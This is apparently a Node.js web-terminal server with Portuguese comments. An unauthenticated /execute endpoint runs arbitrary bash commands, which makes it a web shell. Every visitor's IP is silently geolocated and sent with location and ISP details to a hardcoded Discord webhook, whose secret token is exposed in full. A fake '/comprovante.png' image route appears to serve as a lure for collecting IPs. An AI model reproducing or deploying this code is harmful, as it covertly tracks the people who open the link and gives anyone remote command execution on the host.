const http = require('http');
const https = require('https');
const { exec } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs');
const url = require('url');

const sessions = {};
const commandHistory = {};

const PORT = process.env.PORT || 8080;

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1378373450724282591/NgUHR6_qha9zIVs6-RloaPBAY8jqAMPbdM6RRzaZtkj0HHMIhC0wH8f0my42zh0JzxxT';

function notifyDiscord(message) {
  const data = JSON.stringify({ content: message });

  fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    },
    body: data
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`Erro ao enviar para o Discord: ${response.statusText}`);
    }
    return response.text();
  })
  .then(text => {
    console.log('Mensagem enviada para o Discord:', text);
  })
  .catch(error => {
    console.error('Erro ao enviar para o Discord:', error);
  });
}

function lookupIP(ip, callback) {
  const apiUrl = `https://web-api.nordvpn.com/v1/ips/lookup/${ip}`;
  https.get(apiUrl, res => {
    let data = '';
    res.on('data', chunk => { data += chunk; });
    res.on('end', () => {
      try {
        const json = JSON.parse(data);
        callback(null, json);
      } catch (err) {
        callback(err);
      }
    });
  }).on('error', err => {
    callback(err);
  });
}

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const method = req.method;
  const pathname = parsedUrl.pathname;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const ipHeader = req.headers['x-forwarded-for'];
  const sessionId = ipHeader ? ipHeader.split(',')[0].trim() : req.socket.remoteAddress;

  // Consulta o IP e envia notificação ao Discord
  lookupIP(sessionId, (err, ipInfo) => {
    if (!err && ipInfo) {
      const message = `\`\`\`🖥️ Novo acesso detectado!\n` +
        `IP: ${ipInfo.ip}\n` +
        `País: ${ipInfo.country} (${ipInfo.country_code})\n` +
        `Região: ${ipInfo.region}\n` +
        `Cidade: ${ipInfo.city}\n` +
        `ISP: ${ipInfo.isp}\n` +
        `ASN: ${ipInfo.isp_asn}\n` +
        `Host: ${ipInfo.host?.domain || 'N/A'}\`\`\``;
      notifyDiscord(message);
    } else {
      notifyDiscord(`\`\`\`🖥️ Novo acesso detectado! IP: ${sessionId}\`\`\``);
    }
  });

  if (pathname === '/autocomplete' && method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const { partial, sessionId: clientSessionId } = JSON.parse(body);
      const currentDirectory = sessions[clientSessionId] || process.cwd();
      const partialName = path.basename(partial);

      fs.readdir(currentDirectory, (err, files) => {
        if (err) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ suggestion: partial }));
        }

        const matches = files.filter(file => file.startsWith(partialName));

        if (matches.length === 1) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ suggestion: matches[0] }));
        } else if (matches.length > 1) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ suggestion: matches[0], allMatches: matches }));
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ suggestion: partial }));
        }
      });
    });
  } else if (pathname === '/comprovante.png' && method === 'GET') {
    const htmlContent = `
      <html style="height:100%">
      <meta content="width=device-width,minimum-scale=0.1" name="viewport">
      <style>
        body {
          margin:0;
          height:100%;
          background-color:#0e0e0e;
          display:flex;
          justify-content:center;
          align-items:center;
        }
        img {
          display:block;
          -webkit-user-select:none;
          background-color:#e5e5e5;
        }
      </style>
      <body>
        <img alt="Imagem" src="https://i.imgur.com/IlweEFM.gif">
      </body>
      </html>
    `;
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(htmlContent);
  } else if (pathname === '/execute' && method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const { command, sessionId: clientSessionId } = JSON.parse(body);
      const sid = clientSessionId || sessionId;
      if (!command || !sid) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Comando ou sessão inválida.' }));
      }

      if (!commandHistory[sid]) {
        commandHistory[sid] = [];
      }
      commandHistory[sid].push(command);

      let currentDirectory = sessions[sid] || process.cwd();

      if (command.startsWith('cd ')) {
        const targetDir = command.slice(3).trim();
        const newDir = path.resolve(currentDirectory, targetDir);
        if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
          sessions[sid] = newDir;
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            output: '',
            pwd: newDir,
            username: os.userInfo().username,
            hostname: os.hostname()
          }));
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            output: `cd: ${targetDir}: No such directory`,
            pwd: currentDirectory,
            username: os.userInfo().username,
            hostname: os.hostname()
          }));
        }
      } else {
        exec(command, { cwd: currentDirectory, shell: '/bin/bash' }, (error, stdout, stderr) => {
          const output = error ? (stderr || error.message) : stdout;
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            output,
            pwd: currentDirectory,
            username: os.userInfo().username,
            hostname: os.hostname()
          }));
        });
      }
    });
  } else if (pathname === '/history' && method === 'GET') {
    if (!sessionId) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Sessão não informada.' }));
    }
    const history = commandHistory[sessionId] || [];
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ history }));
  } else if (pathname === '/info' && method === 'GET') {
    sessions[sessionId] = process.cwd();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      username: os.userInfo().username,
      hostname: os.hostname(),
      pwd: sessions[sessionId],
      sessionId
    }));
  } else if (method === 'GET') {
    let filePath = path.join(__dirname, 'public', pathname === '/' ? 'index.html' : pathname);
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('404 Not Found');
      } else {
        let contentType = 'text/html';
        if (filePath.endsWith('.css')) contentType = 'text/css';
        else if (filePath.endsWith('.js')) contentType = 'application/javascript';
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(data);
      }
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('404 Not Found');
  }
});

server.listen(PORT, () => {
  console.log(`🚀 Terminal web rodando em http://localhost:${PORT}`);
});